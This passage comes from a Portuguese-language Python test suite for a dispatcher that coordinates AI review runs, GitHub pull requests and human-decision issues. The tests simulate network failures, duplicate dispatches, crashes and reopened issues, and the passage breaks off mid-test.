        d.ciclo()
        self.assertNotIn("gate_falhou_apos_fixer:s-1", self.estado()["chavesAcordadas"])
        self.assertEqual(self.estado()["decisoes"], [])
        d.ciclo()
        self.assertTrue(self.forja.decisao(antiga["url"])["fechada"])
        # a tentativa 2 reusa s-1 com outro PR e também precisa do Paulo: issue nova, com o PR novo
        novo_plan_run = self.estado()["raias"]["a"]["planRunId"]
        pr7 = "https://github.com/dono/cliente/pull/77"
        self.motor.definir_plano(novo_plan_run, "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r7", "prUrl": pr7}])
        self.forja.definir_pr(pr7, head_sha=H2, branch="warren/s-1b", arquivos=["db/migrations/7.sql"])
        self.forja.definir_ci(REPO, H2, "verde")
        d.ciclo()
        self.terminar_revisao(H2)
        d.ciclo()
        (nova,) = self.estado()["decisoes"]
        self.assertNotEqual(nova["url"], antiga["url"])
        self.assertEqual(nova["pr"], pr7)
        self.assertIn(pr7, self.forja.decisoes[-1][1])

    def test_p3_decisao_de_seed_e_chaveada_pelo_pr(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        # uma decisão da mesma seed, mas de outro PR, continua acompanhada (estado antigo)
        velha = self.forja.abrir_decisao(REPO, "[fábrica] s-1: decisão necessária", "PR antigo")
        d.estado["decisoes"].append({"url": velha, "motivo": "outro PR", "alvo": "s-1", "pr": "https://github.com/dono/cliente/pull/3"})
        d._salvar()
        d.ciclo()
        nova = [x for x in self.estado()["decisoes"] if x.get("pr") == PR]
        self.assertEqual(len(nova), 1)
        self.assertNotEqual(nova[0]["url"], velha)
        self.assertIn(PR, self.forja.decisoes[-1][1])

    def test_p9_seed_mergeada_com_pr_novo_de_outro_plan_run_recomeca(self):
        d = self.preparar_raia(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "merged", "runId": "r1", "prUrl": PR}])
        d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "mergeada")
        pr8 = "https://github.com/dono/cliente/pull/88"
        self.motor.definir_plano("plano-2", "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r8", "prUrl": pr8}])
        self.forja.definir_pr(pr8, head_sha=H2, branch="warren/s-1-b", arquivos=["src/b/x.ts"])
        self.forja.definir_ci(REPO, H2, "verde")
        d.ciclo()
        seed = self.estado()["seeds"]["s-1"]
        self.assertEqual((seed["estado"], seed["pr"]), ("em_revisao", pr8))
        self.assertEqual(self.runs(OPUS)[-1]["branch_existente"], "warren/s-1-b")

    # ------------------------------------------------ P4
    def test_p4_404_sem_nenhuma_leitura_boa_nao_sintetiza(self):
        """Sonda p_i1_404_total: um proxy errado responde 404 a tudo num ciclo."""

        class Motor404(motor.MotorFalso):
            fora = False

            def run(self, run_id):
                if self.fora:
                    self._registrar("run", run_id=run_id)
                    raise RuntimeError("GET /runs/%s: HTTP 404" % run_id)
                return super().run(run_id)

            def plano(self, plan_run_id):
                if self.fora:
                    self._registrar("plano", plan_run_id=plan_run_id)
                    raise RuntimeError("GET /plan-runs/%s: HTTP 404" % plan_run_id)
                return super().plano(plan_run_id)

        self.motor = Motor404()
        d, orq = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.motor.definir_plano("plano-2", "running", [{"seedId": "s-b", "estado": "pr_open", "runId": "rb", "prUrl": PR}])
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-b", arquivos=["src/b/x.ts"])
        self.forja.definir_ci(REPO, H1, "verde")
        d.ciclo()
        rev = self.estado()["seeds"]["s-b"]["revisaoRunId"]
        n_fable, n_opus = len(self.runs(FABLE)), len(self.runs(OPUS))
        self.motor.fora = True
        d.ciclo()
        self.motor.fora = False
        d.ciclo()
        e = self.estado()
        self.assertEqual((e["orquestrador"]["runId"], e["seeds"]["s-b"]["revisaoRunId"]), (orq, rev))
        self.assertEqual((len(self.runs(FABLE)), len(self.runs(OPUS))), (n_fable, n_opus))

    def test_p4_run_com_timeout_de_leitura_e_planos_ok_abre_uma_decisao_parcial(self):
        """c22 e5: GET /runs/{id} com falha de rede por 30 ciclos, GET /plan-runs ok."""

        class MotorRunFora(motor.MotorFalso):
            alvo = None

            def run(self, run_id):
                if run_id == self.alvo:
                    self._registrar("run", run_id=run_id)
                    raise motor.FalhaIncerta("GET /runs/x: falha de rede (TimeoutError)")
                return super().run(run_id)

        self.motor = MotorRunFora()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.alvo = rid
        for _ in range(9):
            d.ciclo()
        self.assertEqual(self.forja.decisoes, [])
        for _ in range(21):
            d.ciclo()
        titulos = [t for t, _ in self.forja.decisoes]
        self.assertEqual(len(titulos), 1)
        self.assertTrue(titulos[0].startswith("[fábrica] Warren parcialmente inacessível"))
        self.assertIn(rid, self.forja.decisoes[0][1])
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], rid)  # nada sintetizado
        url = self.estado()["warrenParcial"]["url"]
        self.motor.alvo = None
        for _ in range(2):
            d.ciclo()
        self.assertFalse(self.forja.decisao(url)["fechada"])
        d.ciclo()
        self.assertTrue(self.forja.decisao(url)["fechada"])

    def test_p4_warren_alternando_nao_abre_e_fecha_a_issue_a_cada_rodada(self):
        """c22 e4: 5 ciclos fora + 1 com leitura, seis vezes: uma issue só."""
        self.motor = MotorForaDoAr()
        d = self.preparar_raia()
        for _ in range(6):
            self.motor.fora = True
            for _ in range(5):
                d.ciclo()
            self.motor.fora = False
            d.ciclo()
        self.assertEqual([t for t, _ in self.forja.decisoes], ["[fábrica] Warren inacessível"])
        self.assertFalse(self.forja.decisao(self.estado()["warrenFora"]["url"])["fechada"])

    # ------------------------------------------------ P5, P6, P7
    def test_p5_busca_que_falha_5_vezes_abre_mesmo_assim_com_nota(self):
        class ForjaBuscaQuebrada(forja.ForjaFalsa):
            def procurar_decisao(self, repo, nonce, desde=None):
                self._registrar("procurar_decisao", repo=repo, nonce=nonce, desde=desde)
                raise RuntimeError("GET /issues: HTTP 502")

        self.forja = ForjaBuscaQuebrada()
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        original = self.forja.abrir_decisao
        self.forja.abrir_decisao = lambda *a: (_ for _ in ()).throw(RuntimeError("POST /issues: HTTP 504"))
        d.ciclo()  # a intenção fica gravada; a abertura falhou
        self.forja.abrir_decisao = original
        (intencao,) = self.estado()["decisoesPendentes"]
        self.assertRegex(intencao["desde"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        d.ciclo()
        buscas = [a for n, a in self.forja.chamadas if n == "procurar_decisao"]
        self.assertEqual(buscas[-1]["desde"], intencao["desde"])  # P5: a busca usa a hora da intenção
        for _ in range(6):
            d.ciclo()
        self.assertEqual(self.estado()["decisoesPendentes"], [])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertIn("Possível duplicata após reinício", corpo)
        self.assertEqual([x["alvo"] for x in self.estado()["decisoes"]], ["s-1"])

    def test_p6_decisao_apagada_ou_que_nao_reabre_vira_issue_nova(self):
        for caso in ("404", "reabrir"):
            with self.subTest(caso=caso):
                self.setUp()
                if caso == "reabrir":
                    class ForjaTrancada(forja.ForjaFalsa):
                        def reabrir_decisao(self, url, comentario):
                            self._registrar("reabrir_decisao", url=url, comentario=comentario)
                            raise RuntimeError("PATCH /issues/1: HTTP 403")

                    self.forja = ForjaTrancada()
                d = self.preparar_raia()
                self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
                d.ciclo()
                self.terminar_revisao(H1)
                d.ciclo()
                (velha,) = self.estado()["decisoes"]
                if caso == "404":
                    del self.forja._decisoes[velha["url"]]
                    d.ciclo()
                else:
                    self.forja.definir_decisao(velha["url"], fechada=True)
                    for _ in range(5):
                        d.ciclo()
                (nova,) = self.estado()["decisoes"]
                self.assertNotEqual(nova["url"], velha["url"])
                self.assertEqual((nova["alvo"], nova["motivo"], nova["pr"]), ("s-1", velha["motivo"], PR))
                self.assertFalse(self.forja.decisao(nova["url"])["fechada"])
                self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")

    def test_p7_registrar_a_issue_ja_bloqueia_a_seed(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        original = d._aplicar

        def cair(acao, resultado):
            if acao.get("tipo") == "aguardar_humano":
                raise KeyboardInterrupt
            return original(acao, resultado)

        d._aplicar = cair
        with self.assertRaises(KeyboardInterrupt):
            d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
        (decisao,) = self.estado()["decisoes"]
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="pode mergear")
        outro = self.novo()
        outro.ciclo()
        outro.ciclo()
        self.assertEqual(len(self.forja.decisoes), 1)  # a resposta não reabriu a necessidade
        self.assertIn("pode mergear", self.runs(FABLE)[-1]["prompt"])

    # ------------------------------------------------ P10
    def test_p10_config_invalida_no_rodar_abre_uma_decisao_e_sai_com_2(self):
        self.preparar_raia()
        ambiente = {"FABRICA_RAIZ": str(self.raiz), "FABRICA_REPO": REPO}
        config = {k: v for k, v in CONFIG.items()}
        config["modelos"] = {k: v for k, v in CONFIG["modelos"].items() if k != "revisor"}
        for _ in range(2):
            erro = io.StringIO()
            codigo = despachante.main(
                ["rodar"], ambiente=ambiente, construir=lambda amb: self.novo(config=config), saida=io.StringIO(), erro=erro, abrir_forja=lambda amb: self.forja
            )
            self.assertEqual(codigo, 2)
        ((titulo, corpo),) = self.forja.decisoes
        self.assertIn("config inválida: modelos.revisor", titulo)
        (decisao,) = [x for x in self.estado()["decisoes"] if x.get("tipo") == "config"]
        # com a config corrigida, o despachante fecha a issue no primeiro ciclo
        d = self.novo()
        d.ciclo()
        d.ciclo()
        self.assertTrue(self.forja.decisao(decisao["url"])["fechada"])
        self.assertFalse([x for x in self.estado()["decisoes"] if x.get("tipo") == "config"])

    def test_p10_sem_forja_ou_sem_estado_nao_lanca(self):
        def quebrada(amb):
            raise OSError("sem token")

        self.assertIsNone(despachante.decidir_config_invalida({"FABRICA_REPO": REPO}, self.raiz, despachante.ConfigInvalida("x"), quebrada))
        self.preparar_raia()
        self.assertIsNone(despachante.decidir_config_invalida({"FABRICA_REPO": REPO}, self.raiz, despachante.ConfigInvalida("x"), quebrada))


# ---------------------------------------------------------------- estado compacto


class Morte(BaseException):
    """Queda do processo no meio de uma gravação (não é `Exception`: o despachante não a engole)."""


class TestesRodada4(Base):
    """Rodada 4: Q1 (duplicata paga com run na fila), Q2 (busca que falha), Q3 (fechada de novo), Q4–Q6."""

    UTC = datetime.timezone.utc
    TITULO_PAUSA = "[fábrica] despachante pausado: " + despachante.PAUSA_DESPACHOS_REJEITADOS

    def _tique(self, fila, visto):
        """Um ciclo do Warren lotado: um run na fila há `fila` ciclos começa a rodar."""
        for rid, run in list(self.motor._runs.items()):
            if run["estado"] == "queued":
                visto[rid] = visto.get(rid, 0) + 1
                if visto[rid] >= fila:
                    self.motor.iniciar_run(rid)

    def _warren_lento(self, vezes, *, historico=60, dialeto="sqlite", criar=True):
        """Todo POST /runs (até `vezes`) cria o run e perde a resposta; `historico` runs alheios iniciados há 1 h."""
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", vezes, criar)
        self.motor.dialeto = dialeto
        if historico:
            self.motor.iniciar_historico(historico, projeto=PROJETO, ha=datetime.timedelta(hours=1))
        self.motor.enfileirar(True)

    def _titulos(self):
        return [t for t, _ in self.forja.decisoes]

    def _runs_criados(self):
        return [r for r in self.motor._runs if r.startswith("run-")]

    # ------------------------------------------------ Q1 (Critical): duplicata paga com o run ainda na fila
    def test_q1_run_na_fila_atras_do_historico_nao_e_redespachado(self):
        """c29 b2: 60 runs iniciados no projeto; o run incerto fica queued (started_at NULL) por 2 e 5 ciclos."""
        for dialeto in ("sqlite", "postgres"):
            for fila in (2, 5):
                with self.subTest(dialeto=dialeto, fila=fila):
                    self.setUp()
                    self._warren_lento(1, dialeto=dialeto)
                    d = self.preparar_raia()
                    self.abrir_pr(H1)
                    visto = {}
                    for _ in range(9):
                        self._tique(fila, visto)
                        d.ciclo()
                    criados = self._runs_criados()
                    self.assertEqual(len(criados), 1)
                    self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], criados[0])
                    self.assertEqual(self.estado()["despachosIncertos"], [])
                    self.assertEqual(len(self.runs(OPUS)), 1)

    def test_q1_warren_lento_em_todo_post_nao_duplica_nem_pausa(self):
        """c29 b3: todo POST perde a resposta, runs ficam 6 ciclos na fila, 60 ciclos: 1 revisão paga e nenhuma pausa."""
        self._warren_lento(10**6)
        d = self.preparar_raia()
        self.abrir_pr(H1)
        visto = {}
        for _ in range(60):
            self._tique(6, visto)
            d.ciclo()
        e = self.estado()
        self.assertEqual(len(self._runs_criados()), 1)
        self.assertEqual(e["seeds"]["s-1"]["revisaoRunId"], self._runs_criados()[0])
        self.assertIsNone(e["pausado"])
        self.assertFalse(e.get("adiamentosRede"))
        self.assertEqual([t for t in self._titulos() if "pausado" in t or "parcialmente" in t], [])

    def test_q1_orquestrador_com_warren_lento_paga_um_run_so(self):
        """c32 q1: acordar com todo POST incerto e run 5 ciclos na fila; 60 ciclos, retomar, mais 40."""
        self._warren_lento(10**6)
        d = self.preparar_raia()
        self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
        visto = {}
        for _ in range(60):
            self._tique(5, visto)
            d.ciclo()
        e = self.estado()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(len(self._runs_criados()), 1)
        self.assertEqual(e["orquestrador"]["runId"], self._runs_criados()[0])
        self.assertIsNone(e["pausado"])
        url = (e.get("decisaoPausa") or {}).get("url")
        if url:
            self.forja.definir_decisao(url, fechada=True)
        for _ in range(40):
            self._tique(5, visto)
            d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(len(self.acordadas()), 1)

    def test_q1_chave_de_idempotencia_e_o_nonce_raiz_reusado_na_cadeia(self):
        """O primeiro nonce da cadeia vai em `Idempotency-Key` e volta no redespacho; a cadeia nova ganha outra chave."""
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 1, criar=False)  # o POST não chegou a criar
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        raiz = self.estado()["noncesRaiz"]["revisar:s-1"]
        item = self.estado()["despachosIncertos"][0]
        self.assertEqual(item["nonce"], raiz)
        self.assertRegex(item["desde"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        for _ in range(3):
            self.instante += datetime.timedelta(minutes=2)  # F6: o piso de 5 min passa junto com as 3 buscas
            d.ciclo()  # 3 buscas sem achar: descartado e redespachado (mesma chave, nonce novo no texto)
        buscas = [a for nome, a in self.motor.chamadas if nome == "procurar_run"]
        self.assertEqual([(b["nonce"], b["desde"]) for b in buscas], [([raiz], item["desde"])] * 3)  # a hora da ação limita a busca
        revisoes = self.runs(OPUS)
        self.assertEqual(len(revisoes), 2)
        self.assertEqual([r["chave_idempotencia"] for r in revisoes], [raiz, raiz])
        nonces = [r["prompt"].rsplit("nonce=", 1)[1][:32] for r in revisoes]
        self.assertEqual(nonces[0], raiz)
        self.assertNotEqual(nonces[0], nonces[1])
        self.assertNotIn("revisar:s-1", self.estado().get("noncesRaiz") or {})  # cadeia encerrada com o id
        # uma revisão nova do mesmo seed (head novo) é outra cadeia: chave diferente
        self.terminar_revisao(H1)
        self.mover_head(H2)
        d.ciclo()
        revisoes = self.runs(OPUS)
        self.assertEqual(len(revisoes), 3)
        self.assertNotEqual(revisoes[2]["chave_idempotencia"], raiz)
        self.assertEqual(revisoes[2]["chave_idempotencia"], revisoes[2]["prompt"].rsplit("nonce=", 1)[1][:32])
        # o orquestrador também manda a chave; o Plan Run não (o Warren não a aceita em POST /plan-runs)
        self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
        d.ciclo()
        self.assertTrue(self.runs(FABLE)[-1]["chave_idempotencia"])
        self.assertNotIn("chave_idempotencia", self.planos_despachados()[0])

    def test_q1_chave_segura_a_duplicata_quando_a_busca_nao_enxerga(self):
        """Segunda trava: com a busca cega, o redespacho com a mesma chave recebe do Warren o run já criado."""
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 1)
        self.motor.procurar_run = lambda projeto, nonce, desde=None: None
        d = self.preparar_raia()
        self.abrir_pr(H1)
        for _ in range(5):
            self.instante += datetime.timedelta(minutes=2)  # F6: o piso de 5 min passa
            d.ciclo()
        criados = self._runs_criados()
        self.assertEqual(len(criados), 1)
        self.assertEqual(len(self.runs(OPUS)), 2)  # dois POSTs, um run pago
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], criados[0])

    def test_q1_incerto_nunca_achado_nao_conta_como_rejeicao(self):
        """Q1(c): só a FalhaAntesDoEnvio conta para a pausa "Warren rejeitando despachos"."""
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 10**6, criar=False)
        d = self.preparar_raia()
        self.abrir_pr(H1)
        for _ in range(45):
            self.instante += datetime.timedelta(minutes=2)  # F6: o piso de 5 min passa a cada 3 buscas
            d.ciclo()
        e = self.estado()
        self.assertIsNone(e["pausado"])
        self.assertFalse(e.get("adiamentosRede"))
        descartes = [linha for linha in self.log() if linha.get("evento") == "despacho_incerto_descartado"]
        self.assertGreaterEqual(len(descartes), 10)
        self.assertEqual(self._titulos(), [])
        self.assertEqual(self._runs_criados(), [])

    # ------------------------------------------------ Q2: busca pelo nonce que falha sempre
    def _incerto_com_busca_falha(self, modo, acao):
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 1)

        def falha(projeto, nonce, desde=None, _m=modo):
            if _m == "rede":
                raise motor.FalhaIncerta("GET /runs: falha de rede (TimeoutError)")
            raise RuntimeError("GET /runs?project=x: HTTP 500")

        self.motor.procurar_run = falha
        d = self.preparar_raia()
        if acao == "revisar":
            self.abrir_pr(H1)
            chave = "revisar:s-1"
        else:
            self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
            chave = "acordar:raia_falhou:a"
        d.ciclo()  # o POST fica incerto
        self.assertEqual([i["chave"] for i in self.estado()["despachosIncertos"]], [chave])
        return d, chave

    def test_q2_busca_que_falha_sempre_abre_decisao_e_segura_o_item(self):
        """c29 c1: HTTP 500 ou rede na busca, com o resto do Warren ok, por 40 ciclos."""
        for modo in ("http500", "rede"):
            for acao in ("revisar", "acordar"):
                with self.subTest(modo=modo, acao=acao):
                    self.setUp()
                    d, chave = self._incerto_com_busca_falha(modo, acao)
                    titulo = "[fábrica] despacho não confirmado: " + chave
                    for _ in range(9):
                        d.ciclo()
                    self.assertNotIn(titulo, self._titulos())  # 9 falhas seguidas: ainda não
                    d.ciclo()  # 10ª
                    self.assertIn(titulo, self._titulos())
                    for _ in range(30):
                        d.ciclo()
                    e = self.estado()
                    self.assertEqual([i["chave"] for i in e["despachosIncertos"]], [chave])
                    self.assertGreaterEqual(e["despachosIncertos"][0]["falhasBusca"], 40)
                    self.assertEqual(len(self.runs(OPUS if acao == "revisar" else FABLE)), 1)  # sem redespacho
                    self.assertIsNone(e["pausado"])
                    self.assertEqual(self._titulos().count(titulo), 1)
                    rastreadas = [x for x in e["decisoes"] if x.get("tipo") == "incerto"]
                    self.assertEqual([x["alvo"] for x in rastreadas], [chave])
                    self.assertEqual(rastreadas[0]["motivo"], "não foi possível confirmar o despacho de " + chave)
                    if modo == "rede" and acao == "revisar":
                        # as falhas de rede da busca entram na contabilidade do ciclo (P4: parcialmente inacessível)
                        self.assertGreaterEqual(e["falhasDeRede"].get(chave, 0), 10)
                        self.assertTrue(any("parcialmente" in t and chave in t for t in self._titulos()))
                    elif acao == "acordar":
                        # com a busca como única leitura do Warren no ciclo, o ciclo inteiro conta como Warren fora
                        self.assertIn(despachante.TITULO_WARREN, self._titulos())
                    else:
                        self.assertNotIn(chave, e.get("falhasDeRede") or {})
                        self.assertNotIn(despachante.TITULO_WARREN, self._titulos())

    def test_q2_queda_ao_abrir_a_decisao_e_recuperada_pelo_nonce(self):
        d, chave = self._incerto_com_busca_falha("http500", "revisar")
        for _ in range(9):
            d.ciclo()
        original = self.forja.abrir_decisao

        def cair(repo, titulo, corpo):
            url = original(repo, titulo, corpo)
            raise Morte()  # a issue existe no GitHub, o estado ainda não a registrou

        self.forja.abrir_decisao = cair
        with self.assertRaises(Morte):
            d.ciclo()  # 10ª falha: abre a decisão e cai
        self.forja.abrir_decisao = original
        self.assertEqual([i["tipo"] for i in self.estado()["decisoesPendentes"]], ["incerto"])
        d2 = self.novo()
        d2.ciclo()
        e = self.estado()
        self.assertEqual(e["decisoesPendentes"], [])
        self.assertEqual([x["alvo"] for x in e["decisoes"] if x.get("tipo") == "incerto"], [chave])
        self.assertEqual(self._titulos().count("[fábrica] despacho não confirmado: " + chave), 1)
        self.assertEqual([i["chave"] for i in e["despachosIncertos"]], [chave])

    def test_q2_busca_que_volta_resolve_o_item_e_fecha_a_decisao(self):
        d, chave = self._incerto_com_busca_falha("http500", "revisar")
        for _ in range(10):
            d.ciclo()
        url = [x for x in self.estado()["decisoes"] if x.get("tipo") == "incerto"][0]["url"]
        del self.motor.procurar_run  # a busca volta
        d.ciclo()
        e = self.estado()
        self.assertEqual(e["despachosIncertos"], [])
        self.assertEqual(e["seeds"]["s-1"]["revisaoRunId"], self._runs_criados()[0])
        self.assertTrue(self.forja._decisoes[url]["fechada"])
        self.assertIn(("fechar_decisao", url), [(n, a.get("url")) for n, a in self.forja.chamadas])
        self.assertEqual([x for x in e["decisoes"] if x.get("tipo") == "incerto"], [])
        self.assertEqual(len(self.runs(OPUS)), 1)
        self.assertNotIn(chave, e.get("noncesRaiz") or {})

    def test_q2_resposta_do_paulo_acorda_o_orquestrador_e_mantem_o_item_incerto(self):
        """R1 (rodada 5): a resposta acorda o orquestrador com o contexto; o item segue incerto (falhasBusca zerado)."""
        for acao in ("revisar", "acordar"):
            with self.subTest(acao=acao):
                self.setUp()
                d, chave = self._incerto_com_busca_falha("http500", acao)
                for _ in range(10):
                    d.ciclo()
                url = [x for x in self.estado()["decisoes"] if x.get("tipo") == "incerto"][0]["url"]
                self.forja.definir_decisao(url, fechada=True, ultimo_comentario="o run existe no Warren, segue")
                d.ciclo()
                e = self.estado()
                self.assertEqual([i["chave"] for i in e["despachosIncertos"]], [chave])
                self.assertEqual(e["despachosIncertos"][0]["falhasBusca"], 1)  # zerado na resposta; a busca deste ciclo falhou
                self.assertNotIn(url, [x.get("url") for x in e["decisoes"]])
                self.assertEqual(len(self.runs(OPUS if acao == "revisar" else FABLE)), 1)  # nada pago a mais
                self.assertIn(chave, e.get("noncesRaiz") or {})  # a cadeia segue aberta
                if acao == "acordar":
                    # o orquestrador incerto segura a resposta na fila; o item continua sem redespacho
                    self.assertEqual([(p["motivo"], p["alvo"]) for p in e["acordarPendentes"]], [("resposta_paulo", url)])
                    contexto = e["acordarPendentes"][0]["contexto"]
                else:
                    self.assertEqual([(a["motivo"], a["alvo"]) for a in self.acordadas()], [("resposta_paulo", url)])
                    contexto = e["orquestrador"]["acordada"]["contexto"]
                    self.assertIn("o run existe no Warren, segue", self.runs(FABLE)[0]["prompt"])
                self.assertEqual(contexto["resposta"], "o run existe no Warren, segue")
                self.assertIn(chave, contexto["pergunta"])
                self.assertEqual(contexto["alvo"], chave)

    # ------------------------------------------------ Q3: decisão fechada de novo sem comentário
    def _relogio_compartilhado(self):
        self.instante = datetime.datetime(2026, 11, 3, 12, 0, 0)
        self.forja.agora = lambda: self.instante.astimezone(self.UTC)

    def _avancar(self, minutos=1):
        self.instante += datetime.timedelta(minutes=minutos)

    def _decisao_de_seed(self):
        self._relogio_compartilhado()
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("src/auth/x.ts",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        url = self.estado()["decisoes"][-1]["url"]
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
        return d, url

    def _reaberturas(self):
        return [a for n, a in self.forja.chamadas if n == "reabrir_decisao"]

    def _fechar_sem_comentario(self, url):
        atual = self.forja._decisoes[url]
        self._avancar()
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario=atual.get("ultimoComentario", ""))

    def test_q3_fechada_de_novo_sem_comentario_e_reaberta_de_novo(self):
        """c31 f12: o último comentário é o do despachante, mas closed_at é posterior à reabertura."""
        for atraso_do_github in (datetime.timedelta(0), datetime.timedelta(hours=1)):
            with self.subTest(atraso_do_github=atraso_do_github):
                self.setUp()
                self._f12(atraso_do_github)

    def _f12(self, atraso_do_github):
        d, url = self._decisao_de_seed()
        if atraso_do_github:
            # relógio do GitHub atrasado em relação ao nosso: closed_at <= reabertaEm mesmo num fechamento novo;
            # o que decide é ser posterior ao closed_at que vimos ao reabrir
            self.forja.agora = lambda: (self.instante - atraso_do_github).astimezone(self.UTC)
        self._fechar_sem_comentario(url)
        self._avancar()
        d.ciclo()
        self.assertEqual(len(self._reaberturas()), 1)
        decisao = [x for x in self.estado()["decisoes"] if x["url"] == url][0]
        self.assertEqual(decisao["reabertaEm"], self.instante.astimezone(self.UTC).strftime("%Y-%m-%dT%H:%M:%SZ"))
        self.assertEqual(decisao["fechamentosSemComentario"], 1)
        self._fechar_sem_comentario(url)  # o Paulo fecha de novo, sem comentário
        for _ in range(20):
            self._avancar()
            d.ciclo()
        e = self.estado()
        self.assertEqual(len(self._reaberturas()), 2)
        self.assertFalse(self.forja._decisoes[url]["fechada"])
        self.assertIn(url, [x["url"] for x in e["decisoes"]])
        self.assertEqual([x for x in e["decisoes"] if x["url"] == url][0]["fechamentosSemComentario"], 2)
        self.assertEqual(self.runs(FABLE), [])

    def test_q3_reabertura_sem_closed_at_visto_usa_a_hora_da_reabertura(self):
        """Reaberta a partir de uma leitura sem closed_at (fechadaEmVista vazio): um closed_at posterior à reabertura conta."""
        d, url = self._decisao_de_seed()
        original = self.forja.decisao
        self.forja.definir_decisao(url, fechada=True)
        self.forja.decisao = lambda u: {"fechada": True, "ultimoComentario": ""}  # sem closed_at
        self._avancar()
        d.ciclo()
        self.forja.decisao = original
        decisao = [x for x in self.estado()["decisoes"] if x["url"] == url][0]
        self.assertEqual(len(self._reaberturas()), 1)
        self.assertIsNone(decisao["fechadaEmVista"])
        self.assertTrue(decisao["reabertaEm"])
        self._fechar_sem_comentario(url)  # closed_at novo, posterior à reabertura
        self._avancar()
        d.ciclo()
        self.assertEqual(len(self._reaberturas()), 2)
        self.assertIn(url, [x["url"] for x in self.estado()["decisoes"]])

    def test_q3_terceiro_fechamento_sem_comentario_acorda_com_resposta_vazia(self):
        """c24 f6: no 3º fechamento sem comentário a decisão sai da lista e o orquestrador é acordado."""
        d, url = self._decisao_de_seed()
        for _ in range(2):
            self._fechar_sem_comentario(url)
            self._avancar()
            d.ciclo()
            self.assertIn(url, [x["url"] for x in self.estado()["decisoes"]])
        self.assertEqual(len(self._reaberturas()), 2)
        self._fechar_sem_comentario(url)
        self._avancar()
        d.ciclo()
        e = self.estado()
        self.assertEqual(len(self._reaberturas()), 2)
        self.assertTrue(self.forja._decisoes[url]["fechada"])
        self.assertNotIn(url, [x["url"] for x in e["decisoes"]])
        self.assertEqual([a["motivo"] for a in self.acordadas()], ["resposta_paulo"])
        contexto = e["orquestrador"]["acordada"]["contexto"]
        self.assertEqual(contexto["resposta"], "")
        self.assertEqual(contexto["alvo"], "s-1")
        self.assertEqual(contexto["observacao"], "decisão fechada 3 vezes sem comentário")
        self.assertIn("fechada 3 vezes sem comentário", self.runs(FABLE)[0]["prompt"])
        for _ in range(7):  # fechamentos seguintes não fazem mais nada
            self._fechar_sem_comentario(url)
            self._avancar()
            d.ciclo()
        self.assertEqual(len(self._reaberturas()), 2)
        self.assertEqual(len(self.runs(FABLE)), 1)

    def test_q3_leitura_velha_depois_da_reabertura_nao_repete_o_comentario(self):
        """c24 f7: o GET ainda devolve o fechamento antigo (closed_at <= reabertaEm) por 3 ciclos."""
        d, url = self._decisao_de_seed()
        self._fechar_sem_comentario(url)
        velha = dict(self.forja._decisoes[url])
        self._avancar()
        d.ciclo()
        self.assertEqual(len(self._reaberturas()), 1)
        self.assertEqual(velha["ultimoComentario"], "")
        original = self.forja.decisao
        atraso = {"n": 3}

        def decisao(u):
            if u == url and atraso["n"] > 0:
                atraso["n"] -= 1
                return dict(velha)
            return original(u)

        self.forja.decisao = decisao
        for _ in range(4):
            self._avancar()
            d.ciclo()
        self.assertEqual(len(self._reaberturas()), 1)
        self.assertIn(url, [x["url"] for x in self.estado()["decisoes"]])
        self.assertFalse(self.forja._decisoes[url]["fechada"])
        # sem closed_at na leitura, vale a regra do marcador (P8): o último comentário é nosso, nada de reabrir
        self.forja.decisao = lambda u: {"fechada": True, "ultimoComentario": despachante.MARCADOR_DESPACHANTE}
        d.ciclo()
        self.assertEqual(len(self._reaberturas()), 1)
        self.assertIn(url, [x["url"] for x in self.estado()["decisoes"]])

    # ------------------------------------------------ Q4: queda em cada gravação do cancelamento
    def test_q4_queda_em_cada_gravacao_do_cancelamento_fecha_o_pr_antigo(self):
        """c19 G4: em qualquer queda (antes ou depois de cada save), o PR da tentativa antiga acaba fechado."""
        original = despachante.gravar_json_atomico
        for modo in ("antes", "depois"):
            for k in range(1, 15):
                with self.subTest(modo=modo, k=k):
                    self.setUp()
                    d = self.preparar_raia()
                    self.abrir_pr(H1)
                    d.ciclo()
